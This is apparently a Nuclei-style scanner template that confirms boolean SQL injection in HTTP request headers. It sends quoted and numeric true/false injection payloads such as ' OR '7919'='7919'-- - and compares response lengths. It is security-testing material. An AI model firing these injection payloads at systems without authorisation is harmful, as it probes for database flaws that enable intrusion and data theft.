id: ptflow-sqli-boolean-header

info:
  name: Boolean SQL Injection Differential Confirmation via Request Header
  author: ptflow
  severity: high
  description: Confirms quoted or numeric boolean SQL injection from a header value with two stable true controls and one false control.
  metadata:
    max-request: 6
    verified: true
  tags: ptflow,dast,sqli,stable,fuzzing-req-header

flow: (http("quoted_true_a") && http("quoted_true_b") && http("quoted_false")) || (http("numeric_true_a") && http("numeric_true_b") && http("numeric_false"))

http:
  -
    id: quoted_true_a
    pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'

    fuzzing:
      - part: header
        mode: single
        type: postfix
        fuzz:
          - "' OR '7919'='7919'-- -"

    matchers:
      - type: dsl
        dsl:
          - 'status_code >= 200 && status_code < 400 && len(body) > 512'
        internal: true

  -
    id: quoted_true_b
    fuzzing:
      - part: header
        mode: single
        type: postfix
        fuzz:
          - "' OR '7927'='7927'-- -"

    matchers:
      - type: dsl
        dsl:
          - 'quoted_true_b_status_code == quoted_true_a_status_code'
          - 'len(quoted_true_b_body) >= len(quoted_true_a_body) - 64 && len(quoted_true_b_body) <= len(quoted_true_a_body) + 64'
        condition: and
        internal: true

  -
    id: quoted_false
    fuzzing:
      - part: header
        mode: single
        type: postfix
        fuzz:
          - "' AND '7919'='7920'-- -"

    matchers:
      - type: dsl
        dsl:
          - 'quoted_false_status_code == quoted_true_a_status_code'
          - '(len(quoted_true_a_body) > len(quoted_false_body) && len(quoted_true_a_body) - len(quoted_false_body) >= 256 && (len(quoted_true_a_body) - len(quoted_false_body)) * 100 >= len(quoted_true_a_body) * 10) || (len(quoted_false_body) > len(quoted_true_a_body) && len(quoted_false_body) - len(quoted_true_a_body) >= 256 && (len(quoted_false_body) - len(quoted_true_a_body)) * 100 >= len(quoted_true_a_body) * 10)'
        condition: and

  -
    id: numeric_true_a
    pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'

    fuzzing:
      - part: header
        mode: single
        type: postfix
        fuzz:
          - ' AND 7919=7919'

    matchers:
      - type: dsl
        dsl:
          - 'status_code >= 200 && status_code < 400 && len(body) > 512'
        internal: true

  -
    id: numeric_true_b
    fuzzing:
      - part: header
        mode: single
        type: postfix
        fuzz:
          - ' AND 7927=7927'

    matchers:
      - type: dsl
        dsl:
          - 'numeric_true_b_status_code == numeric_true_a_status_code'
          - 'len(numeric_true_b_body) >= len(numeric_true_a_body) - 64 && len(numeric_true_b_body) <= len(numeric_true_a_body) + 64'
        condition: and
        internal: true

  -
    id: numeric_false
    fuzzing:
      - part: header
        mode: single
        type: postfix
        fuzz:
          - ' AND 7919=7920'

    matchers:
      - type: dsl
        dsl:
          - 'numeric_false_status_code == numeric_true_a_status_code'
          - '(len(numeric_true_a_body) > len(numeric_false_body) && len(numeric_true_a_body) - len(numeric_false_body) >= 256 && (len(numeric_true_a_body) - len(numeric_false_body)) * 100 >= len(numeric_true_a_body) * 10) || (len(numeric_false_body) > len(numeric_true_a_body) && len(numeric_false_body) - len(numeric_true_a_body) >= 256 && (len(numeric_false_body) - len(numeric_true_a_body)) * 100 >= len(numeric_true_a_body) * 10)'
        condition: and
